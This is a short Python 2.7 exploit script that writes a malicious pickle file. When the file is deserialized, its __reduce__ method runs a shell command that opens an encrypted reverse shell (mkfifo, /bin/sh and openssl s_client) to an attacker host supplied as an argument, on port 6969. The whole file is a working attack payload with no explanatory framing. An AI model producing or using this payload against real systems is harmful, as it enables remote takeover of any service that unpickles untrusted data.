#!/bin/python2.7
import os
import cPickle as pickle
import sys


if len(sys.argv) != 2:
    print("Usage: python2.7 exploit.py <host>")
    sys.exit(-1)


ip = sys.argv[1]


class RCE(object):
    def __reduce__(self):
        cmd = "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect " + ip + ":6969 > /tmp/s; rm /tmp/s"
        return os.system, (cmd,)


with open("payload.pickle", "wb") as f:
    data = pickle.dumps(RCE())
    f.write(data)
